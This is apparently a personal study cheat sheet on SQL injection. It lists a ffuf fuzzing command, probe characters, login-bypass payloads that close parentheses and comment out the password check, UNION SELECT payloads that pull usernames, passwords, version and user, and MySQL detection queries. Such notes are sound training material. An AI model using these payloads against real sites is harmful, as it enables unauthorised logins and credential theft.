```shell
ffuf -w ~/opt/wordlists/sqli.txt -u URL -fs ...
```
```sql
'
"
#
;
)
-- -
')-- -
")-- -
```


> [!NOTE]  Note
> We may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'
> To login as a specific user with SQLi we can't comment out the entire query

## Login Pages
Sometimes queries have () in them to run certain operations before others. If this is the case we'll have to add a close ) to close out the query and make it valid
```sql
Query:
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = 'hash';

Payloads: 
admin')-- -
sqli' or id=5)-- -

New Query:
SELECT * FROM logins WHERE (username='admin')-- -' AND id > 1) AND password = 'hash';
SELECT * FROM logins WHERE (username='sqli' or id=5)-- -' AND id > 1) AND password = 'hash';
```

> [!NOTE] Note
> We add `or id=5` for cases we want to login using a specific user ID instead of a username

## Union Select
Attach a second query to the original one with `UNION SELECT`. Access other tables and databases.
The same amount of columns for both tables in the query is required for `UNION SELECT` so adding numbers beside column names will do the trick i.e `username,password,3,4,5`

```sql
SELECT * from products UNION SELECT username, password, 3, 4 from logins;
```
```sql
UNION SELECT 1,@@version,3,4-- -
UNION SELECT 1,user(),3,4-- -
```

MySQL detection
```sql
select @@version
SELECT POW(1,1) 
SELECT SLEEP(5)
```
